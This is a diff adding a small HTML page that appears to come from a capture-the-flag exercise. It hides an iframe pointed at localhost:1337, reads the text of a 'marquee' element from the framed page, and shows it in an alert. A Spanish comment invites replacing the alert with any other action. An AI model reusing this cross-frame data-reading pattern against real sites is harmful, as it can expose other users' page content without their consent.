@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+<iframe id="flagframe" src="http://localhost:1337/" style="display:none"></iframe>
+<script>
+setTimeout(() => {
+  try {
+    let doc = document.getElementById('flagframe').contentDocument;
+    let flag = doc.querySelector('marquee').textContent;
+    alert(flag); // Puedes cambiar esto por lo que necesites
+  } catch(e) {}
+}, 1000);
+</script>
+</body>
+</html>
